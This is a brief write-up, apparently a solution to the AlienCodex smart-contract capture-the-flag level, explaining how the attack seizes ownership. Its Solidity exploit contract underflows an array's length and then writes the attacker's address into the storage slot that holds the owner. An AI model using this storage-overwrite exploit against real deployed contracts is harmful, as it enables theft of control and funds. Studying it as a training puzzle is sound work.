```javascript
pragma solidity ^0.6.0;

abstract contract AlienCodex{
    function make_contact() public virtual;
    function record(bytes32 _content) public virtual;
    function retract() public virtual;
    function revise(uint i, bytes32 _content) public virtual;
}

contract AlienCodexAttack {
    function attack(address addr) public {
        AlienCodex ac = AlienCodex(addr);
        ac.make_contact();
        ac.retract(); // underflow to make changable range 2**256-1
        uint start_slot = uint(keccak256(abi.encode(1)));
        uint target_slot = (2**256-1) - start_slot + 1;
        bytes32 content = 0x000000000000000000000001[PUT YOUR WALLET ADDRESS HERE];
        ac.revise(target_slot, content);
    }
}
```


The contract inherits `Ownable`, which contains the variable owner.
The idea here is to replace the `owner` updating the storage (value in slot) forcefully using the function `revise`. This works because after the underflow attack, the array size is `2**256-1`, which menas EVM's address space is reachable.
